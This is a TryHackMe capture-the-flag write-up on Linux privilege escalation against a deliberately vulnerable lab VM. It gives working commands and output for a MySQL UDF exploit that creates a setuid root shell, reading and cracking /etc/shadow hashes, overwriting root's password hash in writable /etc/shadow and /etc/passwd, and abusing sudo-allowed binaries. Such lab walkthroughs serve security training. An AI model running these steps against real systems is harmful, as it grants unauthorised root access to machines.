# TryHackMe: Linux PrivEsc (Write-up)

A [Linux PrivEsc](https://tryhackme.com/room/linuxprivesc) is a TryHackMe CTF focussed on Linux privilege escalation.

## [Task 1] Deploy the Vulnerable Debian VM

Deploy the machine and connect with given credentials, `user`:`password321` via SSH.

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/linuxprivesc$ ssh user@10.10.0.141
The authenticity of host '10.10.0.141 (10.10.0.141)' can't be established.
RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.0.141' (RSA) to the list of known hosts.
user@10.10.0.141's password: 
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri May 15 06:41:23 2020 from 192.168.1.125
user@debian:~$ 
```

Once connected, run the `id` command.

```
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

## [Task 2] Service Exploits

Compile, use and exploit the MySQL functions app as per the task requirement.

```shell
user@debian:~$ ls
myvpn.ovpn  tools
user@debian:~$ cd tools; ls
kernel-exploits  mysql-udf  nginx  privesc-scripts  sudo  suid
user@debian:~/tools$ cd mysql-udf/
$ ls
raptor_udf2.c
$ gcc -g -c raptor_udf2.c -fPIC
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 35
Server version: 5.1.73-1+deb6u1 (Debian)

Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
o foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';Query OK, 0 rows affected (0.26 sec)

mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
+------------------------------------------------------------------+
|                                                                0 |
+------------------------------------------------------------------+
1 row in set (0.01 sec)

mysql> /tmp/rootbash -p
    -> ;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/tmp/rootbash -p' at line 1
mysql> exit
Bye
$ /tmp/rootbash -p
rootbash-4.1# rm /tmp/rootbash
```

## [Task 3] Weak File Permissions - Readable /etc/shadow

```shell
# access /etc/shadows with poor permissions
$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
```

```shell
# crack root password hash with john
kali@kali:~/Desktop/repos/ctf/try-hack-me/linuxprivesc$ echo '$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.' > hash.txt
kali@kali:~/Desktop/repos/ctf/try-hack-me/linuxprivesc$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
[sudo] password for kali: 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password321      (?)
1g 0:00:00:14 DONE (2020-09-26 01:12) 0.06901g/s 4275p/s 4275c/s 4275C/s simone13..kelly17
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Root password's suffix numbers are in wrong order. 
Something wrong with room.
Use _123_ not _321_.

## [Task 4] Weak File Permissions - Writable /etc/shadow

Can see that `/etc/shadow` is writable. Create a make a password with SHA-512 hash. Replace `root` hash in shadow file. Switch user with `su` to login as `root`.

```shell
$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow

$ mkpasswd -m sha512 newpasswordhere
Invalid method 'sha512'.

$ mkpasswd -m sha-512 newpasswordhere
$6$o0AZV4Rs4FkQ$C20XNXZvyb93.MDhs/QkjRdFXMq708bu4Enggz30Uo5ek/OP5H2WcfsZcLNxxSiSL6lRA0HuwyV0FDBijSJRh0

$ nano /etc/shadow

$ su root
Password: 

root@debian:/home/user/tools/mysql-udf# 
```

## [Task 5] Weak File Permissions - Writable /etc/passwd 

Write permissions on /etc/passwd can be exploited.

```shell
user@debian:~/tools/mysql-udf$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
user@debian:~/tools/mysql-udf$ openssl passwd newpasswordhere
Warning: truncating password to 8 characters
FaINQ1evqPxvU
user@debian:~/tools/mysql-udf$ nano /etc/passwd
```

Replace the root password in nano, or the text editor of your choice.

```
root:FaINQ1evqPxvU:0:0:root:/root:/bin/bash
```

```shell
user@debian:~/tools/mysql-udf$ su root
Password: 
root@debian:/home/user/tools/mysql-udf# 
```

Then run `id` as `root`.

```
root@debian:/home/user/tools/mysql-udf# id
uid=0(root) gid=0(root) groups=0(root)
```

## [Task 6] Sudo - Shell Escape Sequences 

Running `sudo -l` reveals a list of programs your user can run as `root`.

```
user@debian:~/tools/mysql-udf$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

These can then be researched on [GTFOBins](https://gtfobins.github.io/) for privilege escalation.

The user can run 11 files as root.

```
user@debian:~/tools/mysql-udf$ sudo -l | grep '(root)' | wc -l
11
```

The file `apache2` does not have a shell escape command on GTFOBins. However, you could run a webserver with `root` privileges and exploit some malicious code with, _for example_, PHP.






